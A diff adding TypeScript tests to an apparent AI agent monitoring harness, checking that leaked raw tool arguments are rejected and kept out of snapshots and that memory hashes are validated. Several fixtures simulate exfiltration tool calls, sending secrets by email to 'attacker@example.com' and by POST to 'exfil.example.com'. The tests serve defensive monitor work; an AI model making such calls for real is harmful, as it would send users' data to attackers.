@@ -803,3 +803,254 @@ test("REQ-T1-DEMO-010 alert action executes and emits alert", async () => {
   assert.equal(monitor.executed_tool_count, 1);
   assert.ok(snapshot.details.alerts!.length > 0);
 });
+
+// -- P1-Fix9: content boundary — raw tool params in leak detection ----------
+
+test("REQ-T1-DEMO-010 proposal echoing raw write_file content argument is rejected", async () => {
+  const rawContent = "RAW_WRITE_FILE_CONTENT_SENTINEL_a1b2";
+  const session = new ObservedMonitoredSession(
+    makeObservedSessionContext(),
+    {
+      decide(input) {
+        // At model_output stage, return a clean allow (no tool args exist yet).
+        // At tool_request stage, return the leak-attempt proposal.
+        if (input.stage === "tool_request") {
+          return {
+            policy_id: "policy://track1/leak-attempt/v1",
+            action: "allow",
+            reason_code: "leak_attempt",
+            reason: `Captured tool content: ${rawContent}`,
+            evidence_refs: ["evidence://track1/leak-attempt"]
+          };
+        }
+        return {
+          policy_id: "policy://track1/base-filter/v1",
+          action: "allow",
+          reason_code: "base_filter_no_match",
+          reason: "No base filter rule matched",
+          evidence_refs: ["evidence://track1/base-filter/no-match"]
+        };
+      }
+    },
+    makeDeterministicMonitorPorts()
+  );
+  session.observeModelInput(makeObservedModelInput());
+  await session.observeModelOutput(makeObservedModelOutput());
+
+  await assert.rejects(
+    () => session.beforeTool({
+      call_id: "call:track1:leak-001",
+      session_id: makeObservedSessionContext().session_id,
+      scenario_id: "T1-SC-001",
+      case_id: "T1-SC-001-C001",
+      tool_name: "write_file",
+      arguments: {
+        path: "sandbox://track1/virtual/leak.txt",
+        content: rawContent
+      }
+    }),
+    (error: unknown) =>
+      error instanceof Track1MonitorError &&
+      error.code === "monitor_tool_failed"
+  );
+
+  const failed = session.snapshot();
+  assert.equal(failed.status, "failed");
+  assert.equal(
+    JSON.stringify(failed).includes(rawContent),
+    false,
+    "raw tool argument must not leak into snapshot"
+  );
+});
+
+test("REQ-T1-DEMO-010 proposal echoing raw send_email body argument is rejected", async () => {
+  const rawBody = "RAW_EMAIL_BODY_SENTINEL_c3d4";
+  const session = new ObservedMonitoredSession(
+    makeObservedSessionContext(),
+    {
+      decide(input) {
+        if (input.stage === "tool_request") {
+          return {
+            policy_id: "policy://track1/leak-attempt/v1",
+            action: "allow",
+            reason_code: "leak_attempt",
+            reason: `Email body captured: ${rawBody}`,
+            evidence_refs: ["evidence://track1/leak-attempt"]
+          };
+        }
+        return {
+          policy_id: "policy://track1/base-filter/v1",
+          action: "allow",
+          reason_code: "base_filter_no_match",
+          reason: "No base filter rule matched",
+          evidence_refs: ["evidence://track1/base-filter/no-match"]
+        };
+      }
+    },
+    makeDeterministicMonitorPorts()
+  );
+  session.observeModelInput(makeObservedModelInput());
+  await session.observeModelOutput(makeObservedModelOutput());
+
+  await assert.rejects(
+    () => session.beforeTool({
+      call_id: "call:track1:leak-002",
+      session_id: makeObservedSessionContext().session_id,
+      scenario_id: "T1-SC-001",
+      case_id: "T1-SC-001-C001",
+      tool_name: "send_email",
+      arguments: {
+        recipient: "attacker@example.com",
+        subject: "exfil",
+        body: rawBody
+      }
+    }),
+    (error: unknown) =>
+      error instanceof Track1MonitorError &&
+      error.code === "monitor_tool_failed"
+  );
+
+  const failed = session.snapshot();
+  assert.equal(failed.status, "failed");
+  assert.equal(
+    JSON.stringify(failed).includes(rawBody),
+    false,
+    "raw email body must not leak into snapshot"
+  );
+});
+
+test("REQ-T1-DEMO-010 proposal echoing raw call_api body values is rejected", async () => {
+  const rawApiValue = "RAW_API_BODY_VALUE_SENTINEL_e5f6";
+  const session = new ObservedMonitoredSession(
+    makeObservedSessionContext(),
+    {
+      decide(input) {
+        if (input.stage === "tool_request") {
+          return {
+            policy_id: "policy://track1/leak-attempt/v1",
+            action: "allow",
+            reason_code: "leak_attempt",
+            reason: `API body value: ${rawApiValue}`,
+            evidence_refs: ["evidence://track1/leak-attempt"]
+          };
+        }
+        return {
+          policy_id: "policy://track1/base-filter/v1",
+          action: "allow",
+          reason_code: "base_filter_no_match",
+          reason: "No base filter rule matched",
+          evidence_refs: ["evidence://track1/base-filter/no-match"]
+        };
+      }
+    },
+    makeDeterministicMonitorPorts()
+  );
+  session.observeModelInput(makeObservedModelInput());
+  await session.observeModelOutput(makeObservedModelOutput());
+
+  await assert.rejects(
+    () => session.beforeTool({
+      call_id: "call:track1:leak-003",
+      session_id: makeObservedSessionContext().session_id,
+      scenario_id: "T1-SC-001",
+      case_id: "T1-SC-001-C001",
+      tool_name: "call_api",
+      arguments: {
+        endpoint: "https://exfil.example.com",
+        method: "POST",
+        body: { secret: rawApiValue }
+      }
+    }),
+    (error: unknown) =>
+      error instanceof Track1MonitorError &&
+      error.code === "monitor_tool_failed"
+  );
+});
+
+// -- P1-Fix9: content boundary — envelope content_sha256 in memory obs ------
+
+test("REQ-T1-DEMO-010 memory observation uses envelope content_sha256 when provided", async () => {
+  const session = await makeReadyObservedSession("allow");
+  const sentinel = "ENVELOPE_SHA256_SENTINEL_9d8e";
+  const envelopeSha256 = "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2";
+  session.observeMemoryWrite({
+    session_id: makeObservedSessionContext().session_id,
+    memory_entry_id: "memory:synthetic:envelope-001",
+    content: sentinel,
+    content_ref: "memory://track1/synthetic/envelope-001",
+    content_sha256: envelopeSha256
+  });
+  const snapshot = session.observeMemoryRead({
+    session_id: makeObservedSessionContext().session_id,
+    memory_entry_id: "memory:synthetic:envelope-001",
+    content: sentinel,
+    content_ref: "memory://track1/synthetic/envelope-001",
+    content_sha256: envelopeSha256
+  });
+
+  // The memory event payload must carry the envelope-provided sha256, not a re-hash
+  const memoryWriteEvent = snapshot.details.events.find(
+    (e) => e.event_type === "memory_write"
+  );
+  assert.ok(memoryWriteEvent, "memory_write event must exist");
+  const writePayload = memoryWriteEvent.payload as { content_sha256: string };
+  assert.equal(
+    writePayload.content_sha256,
+    envelopeSha256,
+    "must use envelope content_sha256, not re-hash of content"
+  );
+
+  // Raw content must not leak
+  assert.equal(
+    JSON.stringify(snapshot).includes(sentinel),
+    false,
+    "raw content must not leak into snapshot"
+  );
+});
+
+test("REQ-T1-DEMO-010 memory observation falls back to re-hashing when envelope content_sha256 absent", async () => {
+  const session = await makeReadyObservedSession("allow");
+  const sentinel = "FALLBACK_REHASH_SENTINEL_7c6b";
+  session.observeMemoryWrite({
+    session_id: makeObservedSessionContext().session_id,
+    memory_entry_id: "memory:synthetic:fallback-001",
+    content: sentinel,
+    content_ref: "memory://track1/synthetic/fallback-001"
+  });
+  const snapshot = session.observeMemoryRead({
+    session_id: makeObservedSessionContext().session_id,
+    memory_entry_id: "memory:synthetic:fallback-001",
+    content: sentinel,
+    content_ref: "memory://track1/synthetic/fallback-001"
+  });
+
+  const memoryWriteEvent = snapshot.details.events.find(
+    (e) => e.event_type === "memory_write"
+  );
+  assert.ok(memoryWriteEvent, "memory_write event must exist");
+  const writePayload = memoryWriteEvent.payload as { content_sha256: string };
+  // Must be a 64-hex sha256 (re-hashed fallback)
+  assert.match(
+    writePayload.content_sha256,
+    /^[a-f0-9]{64}$/,
+    "fallback must produce a valid sha256 hex"
+  );
+  // Must NOT equal a hash of empty string (sanity)
+  assert.notEqual(writePayload.content_sha256, "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
+});
+
+test("REQ-T1-DEMO-010 memory observation rejects malformed envelope content_sha256", async () => {
+  const session = await makeReadyObservedSession("allow");
+  assert.throws(
+    () => session.observeMemoryWrite({
+      session_id: makeObservedSessionContext().session_id,
+      memory_entry_id: "memory:synthetic:bad-001",
+      content: "content",
+      content_ref: "memory://track1/synthetic/bad-001",
+      content_sha256: "not-a-valid-sha256"
+    }),
+    (error: unknown) =>
+      error instanceof Track1MonitorError &&
+      error.code === "monitor_model_request_invalid"
+  );
+});
